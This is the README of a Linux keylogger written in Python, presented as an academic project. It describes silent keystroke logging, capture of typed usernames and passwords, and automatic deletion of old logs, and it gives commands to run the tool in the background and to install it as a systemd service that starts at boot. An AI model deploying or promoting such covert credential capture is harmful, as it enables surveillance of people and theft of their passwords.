🔑 Keylogger (Linux Only)
This is a simple keylogger written in Python that runs silently in the background, logs keystrokes, and captures some useful information like active windows and possible sensitive data (like usernames or passwords). It works only on Linux systems.

⚠️ Note: This project is for educational and ethical use only. Please don’t use it for any illegal or unethical purposes.


💻 Features
Logs all keystrokes (regular keys, special keys, etc.)

Tracks active window/application

Detects and logs when usernames, emails, or passwords are typed

Backs up log data automatically

Cleans old logs after 48 hours

Can run only during work hours (9 AM to 5 PM)


🛠️ How to Use
1. Install Dependencies
      [bash]
     pip install pynput
     sudo apt install xdotool  # required for getting active window

2. Run the Script
     [bash]
     python3 keylogger.py

Or, to run it in the background:
     [bash]
     nohup python3 keylogger.py &

⚙️ Auto Start on Boot (Optional)
If you want the keylogger to run automatically on system startup using systemd:

Create a service file:

     [bash]
     sudo nano /etc/systemd/system/keylogger.service

     Add this content (replace /path/to/keylogger.py with the actual file path):

     ini
     [Unit]
     Description=Keylogger Service
     After=network.target

     [Service]
     ExecStart=/usr/bin/python3 /path/to/keylogger.py
     Restart=always

[Install]
WantedBy=multi-user.target
Enable and start the service:

     [bash]
     sudo systemctl enable keylogger.service
     sudo systemctl start keylogger.service


🧠 Educational Purpose
This tool was created as a final-year academic project to explore:

Python automation

OS-level input monitoring

Log management

Ethical hacking practices

📁 Log Location
Logs are stored in your home directory:

     [bash]
     ~/log.txt
     ~/log_backup.txt
Old logs are auto-deleted every 48 hours.

❗ Disclaimer
This tool is designed for educational purposes only. Always get explicit permission before monitoring any system. Unauthorized use is illegal and against ethical guidelines.

